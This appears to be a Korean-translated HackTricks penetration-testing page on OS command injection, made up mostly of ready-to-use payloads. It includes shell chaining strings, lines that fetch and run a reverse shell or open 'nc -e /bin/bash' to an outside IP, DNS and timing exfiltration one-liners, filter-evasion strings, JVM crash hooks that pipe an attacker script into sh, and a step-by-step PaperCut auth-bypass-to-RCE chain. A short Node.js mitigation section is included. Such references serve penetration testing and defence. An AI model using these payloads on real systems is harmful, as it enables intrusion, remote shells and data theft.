# Command Injection

{{#include ../banners/hacktricks-training.md}}

## command Injection이란 무엇인가?

**command injection**은 애플리케이션을 호스팅하는 서버에서 공격자가 임의의 운영체제 명령을 실행할 수 있게 합니다. 그 결과 애플리케이션과 그에 포함된 모든 데이터가 완전히 침해될 수 있습니다. 이러한 명령의 실행은 일반적으로 공격자가 애플리케이션의 환경 및 기반 시스템에 대해 무단으로 접근하거나 제어권을 획득하도록 허용합니다.

### 상황

입력이 **주입되는 위치**에 따라 명령을 실행하기 전에 **인용된 컨텍스트를 종료**( `"` 또는 `'` 사용)해야 할 수 있습니다.

## Command Injection/Execution
```bash
#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)
ls%0abash%09-c%09"id"%0a   # (Combining new lines and tabs)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful

#Not executed but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```
### **Limition** 우회

만약 당신이 **arbitrary commands inside a linux machine**를 실행하려고 한다면, 이 **Bypasses:**를 읽어보면 도움이 될 것입니다.


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### **예제**
```
vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80
vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay
```
### 매개변수

다음은 code injection 및 이와 유사한 RCE 취약성에 노출될 수 있는 상위 25개 매개변수입니다 (출처: [link](https://twitter.com/trbughunters/status/1283133356922884096)):
```
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```
### Time based data exfiltration

데이터 추출: 문자 단위로
```
swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s
```
### DNS 기반 data exfiltration

`https://github.com/HoLyVieR/dnsbin` 도구를 기반으로 하며 dnsbin.zhack.ca에도 호스팅되어 있음
```
1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

```
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
```
DNS 기반 data exfiltration을 확인할 수 있는 온라인 도구:

- dnsbin.zhack.ca
- pingb.in

### 필터링 우회

#### Windows
```
powershell C:**2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:**32\c*?c.e?e # calc
```
#### Linux


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### Node.js `child_process.exec` vs `execFile`

JavaScript/TypeScript 백엔드를 감사할 때 종종 Node.js `child_process` API를 만나게 됩니다.
```javascript
// Vulnerable: user-controlled variables interpolated inside a template string
const { exec } = require('child_process');
exec(`/usr/bin/do-something --id_user ${id_user} --payload '${JSON.stringify(payload)}'`, (err, stdout) => {
/* … */
});
```
`exec()`는 **shell** (`/bin/sh -c`)을 실행하므로, shell에 특별한 의미를 가지는 모든 문자(백틱, `;`, `&&`, `|`, `$()`, …)는 사용자 입력이 문자열에 연결될 때 **command injection**을 초래합니다.

**완화:** `execFile()` (또는 `shell` 옵션 없이 `spawn()`)를 사용하고 **각 인수를 별도의 배열 요소로 제공**하여 shell이 개입하지 않도록 하세요:
```javascript
const { execFile } = require('child_process');
execFile('/usr/bin/do-something', [
'--id_user', id_user,
'--payload', JSON.stringify(payload)
]);
```
Real-world case: *Synology Photos* ≤ 1.7.0-0794 was exploitable through an unauthenticated WebSocket event that placed attacker controlled data into `id_user` which was later embedded in an `exec()` call, achieving RCE (Pwn2Own Ireland 2024).

### Argument/Option injection via leading hyphen (argv, no shell metacharacters)

Not all injections require shell metacharacters. If the application passes untrusted strings as arguments to a system utility (even with `execve`/`execFile` and no shell), many programs will still parse any argument that begins with `-` or `--` as an option. This lets an attacker flip modes, change output paths, or trigger dangerous behaviors without ever breaking into a shell.

Typical places where this appears:

- 임베디드 web UI/CGI 핸들러가 `ping <user>`, `tcpdump -i <iface> -w <file>`, `curl <url>` 등과 같은 명령을 구성하는 경우
- 중앙 집중형 CGI 라우터(예: `/cgi-bin/<something>.cgi`와 같이 `topicurl=<handler>` 같은 선택자 파라미터를 가진 곳)에서 여러 핸들러가 동일한 취약한 밸리데이터를 재사용하는 경우

What to try:

- 하위 도구가 플래그로 해석하도록 `-`/`--`로 시작하는 값을 제공하세요.
- 동작을 변경하거나 파일을 쓰는 플래그를 악용하세요. 예:
- `ping`: `-f`/`-c 100000`로 장치를 과부하시키는 것(DoS)
- `curl`: `-o /tmp/x`로 임의 경로에 쓰기, `-K <url>`로 공격자가 제어하는 구성 불러오기
- `tcpdump`: `-G 1 -W 1 -z /path/script.sh`를 사용해 안전하지 않은 래퍼에서 회전 후 실행(post-rotate execution)을 유발
- 프로그램이 옵션 종료용 `--`를 지원하면, 잘못된 위치에 `--`를 앞에 붙여 naive한 완화책을 우회할 수 있는지 시도해 보세요.

Generic PoC shapes against centralized CGI dispatchers:
```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# Flip options in a downstream tool via argv injection
topicurl=<handler>&param=-n

# Unauthenticated RCE when a handler concatenates into a shell
topicurl=setEasyMeshAgentCfg&agentName=;id;
```
### JVM 진단 콜백을 통한 확실한 exec

JVM 명령줄 인수를 **inject JVM command-line arguments** 할 수 있는 모든 primitive(`_JAVA_OPTIONS`, launcher config files, `AdditionalJavaArguments` fields in desktop agents 등)는 애플리케이션 bytecode를 건드리지 않고 신뢰할 수 있는 RCE로 전환될 수 있다:

1. **메타스페이스나 힙을 축소해 결정론적 크래시를 강제**: `-XX:MaxMetaspaceSize=16m` (또는 아주 작은 `-Xmx`). 이는 초기 bootstrap 단계에서도 `OutOfMemoryError`를 보장한다.
2. **오류 훅을 연결**: `-XX:OnOutOfMemoryError="<cmd>"` 또는 `-XX:OnError="<cmd>"`는 JVM이 중단될 때마다 임의의 OS 명령을 실행한다.
3. 선택적으로 `-XX:+CrashOnOutOfMemoryError`를 추가해 복구 시도를 방지하고 페이로드를 일회성으로 유지할 수 있다.

예시 payloads:
```
-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="cmd.exe /c powershell -nop -w hidden -EncodedCommand <blob>"
-XX:MaxMetaspaceSize=12m -XX:OnOutOfMemoryError="/bin/sh -c 'curl -fsS https://attacker/p.sh | sh'"
```
Because these diagnostics are parsed by the JVM itself, no shell metacharacters are required and the command runs with the same integrity level as the launcher. Desktop IPC bugs that forward user-supplied JVM flags (see [Localhost WebSocket abuse](websocket-attacks.md#localhost-websocket-abuse--browser-port-discovery)) therefore translate directly into OS command execution.

## PaperCut NG/MF SetupCompleted auth bypass -> print scripting RCE

- 취약한 NG/MF 빌드(예: 22.0.5 Build 63914)는 `/app?service=page/SetupCompleted`를 노출합니다; 해당 페이지를 열고 **Login**을 클릭하면 자격증명 없이 유효한 `JSESSIONID`가 반환됩니다 (설정 흐름에서의 authentication bypass).
- **Options → Config Editor**에서 `print-and-device.script.enabled=Y` 및 `print.script.sandboxed=N`으로 설정하여 printer scripting을 활성화하고 sandbox를 비활성화합니다.
- 프린터의 **Scripting** 탭에서 스크립트를 활성화하고 `printJobHook`을 정의된 상태로 유지하여 검증 오류를 피하되, payload를 함수 **외부**에 배치하여 **Apply**를 클릭했을 때 즉시 실행되도록 합니다 (프린트 작업 불필요):
```js
function printJobHook(inputs, actions) {}
cmd = ["bash","-c","curl http://attacker/hit"];
java.lang.Runtime.getRuntime().exec(cmd);
```
- 콜백을 reverse shell로 교체하세요; UI/PoC가 pipes/redirects를 처리하지 못하면, 하나의 명령으로 payload를 stage한 뒤 두 번째 요청으로 실행하세요.
- Horizon3의 [CVE-2023-27350.py](https://github.com/horizon3ai/CVE-2023-27350/blob/main/CVE-2023-27350.py)는 auth bypass, config flips, command execution 및 rollback을 자동화합니다 — 서비스가 내부에서만 접근 가능한 경우 upstream proxy(예: `proxychains` → Squid)를 통해 실행하세요.

## Brute-Force Detection List


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt
{{#endref}}


## 참고자료

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://portswigger.net/web-security/os-command-injection](https://portswigger.net/web-security/os-command-injection)
- [Synology 암호화된 아카이브 추출 – Synacktiv 2025](https://www.synacktiv.com/publications/extraction-des-archives-chiffrees-synology-pwn2own-irlande-2024.html)
- [PHP proc_open manual](https://www.php.net/manual/en/function.proc-open.php)
- [HTB Nocturnal: IDOR → Command Injection → Root via ISPConfig (CVE‑2023‑46818)](https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html)
- [Unit 42 – TOTOLINK X6000R: 세 가지 새로운 취약점 발견](https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/)
- [When WebSockets Lead to RCE in CurseForge](https://elliott.diy/blog/curseforge/)
- [PaperCut NG/MF SetupCompleted auth bypass → print scripting RCE](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [CVE-2023-27350.py (auth bypass + print scripting automation)](https://github.com/horizon3ai/CVE-2023-27350/blob/main/CVE-2023-27350.py)

{{#include ../banners/hacktricks-training.md}}
